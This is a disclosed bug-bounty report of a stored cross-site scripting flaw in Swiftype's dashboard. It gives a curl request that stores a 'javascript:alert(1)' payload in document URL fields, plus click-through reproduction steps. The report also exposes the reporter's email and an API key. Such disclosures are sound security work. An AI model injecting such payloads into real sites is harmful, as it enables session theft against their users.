# [Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`

## Report Details
- **Report ID**: 1245787
- **URL**: https://hackerone.com/reports/1245787
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-06-27T17:12:11.813Z
- **Disclosed**: 2021-08-03T17:12:57.921Z

## Reporter
- **Username**: superman85
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: elastic

## Vulnerability Information
Dear Team,

I have found a stored XSS when create a document via API-based engine. The XSS payload stored in `url` field. 
To understand about document schema for API-based engine, please go to https://swiftype.com/documentation/site-search/guides/schema-design#api-based

After indexed a document with XSS payload stored in `url` field. When view the document details, click on link `View on your site` the XSS will triggered.

Step to reproduce
===

1 - Create a trial account on https://app.swiftype.com/ my admin account email is `qwerty.chan8@gmail.com`
2 - Create a API-based Engine by visit https://app.swiftype.com/engines/api , choose a Engine name and DocumentType Name and click Create Engine.For example in my case (Engine: **123**, DocumentType: **test**)

{F1355460}

3 - Go to https://app.swiftype.com/settings/account and obtain your API Key for example in my case: **gB7BT3iA3GhqoU_SWoRq**

{F1355464}

4 - Call API to create a document follow curl command below, store XSS payload `javascript:alert(1)` in `url` and `thumbnail_url` field value

```
curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' \
  -H 'Content-Type: application/json' \
  -d '{
        "auth_token": "gB7BT3iA3GhqoU_SWoRq",
        "document": {
          "external_id": "v1uyQZNg2vE",
          "fields": [
            {"name": "url", "value": "javascript:alert(1)", "type":  "enum"},
            {"name": "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"},
            {"name": "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"},
            {"name": "title", "value": "How It Feels [through Glass]", "type": "string"},
            {"name": "caption", "value": "Want to see how Glass actually feels?...", "type": "text"},
            {"name": "tags", "value": ["glass", "wearable computing", "google"], "type": "string"},
            {"name": "category_name", "value": "Science & Technology", "type": "string"},
            {"name": "category_id", "value": 28, "type": "enum"},
            {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"},
            {"name": "duration", "value": 136, "type": "integer"},
            {"name": "view_count", "value": 14599202, "type": "integer"},
            {"name": "like_count", "value": 75952, "type": "integer"}
          ]
        }
     }'
```
5 - Go to Engine **123** and click on Manage -> Content or https://app.swiftype.com/engines/123/document_types/test/documents#q=&page=1

{F1355463}

6 - Click on document ID **v1uyQZNg2vE** you just created, you can see the document details

{F1355462}

7 - Click on the link `http://javascript:alert(1)` in document details

{F1355461}

{F1355465}

## Impact

Steal other users sessions, trick users go to unwanted websites

## Attachments
- create_api_engine.png
- click_link.png
- document_details.png
- document_list.png
- retrieve_api_key.png
- xss_fires.png
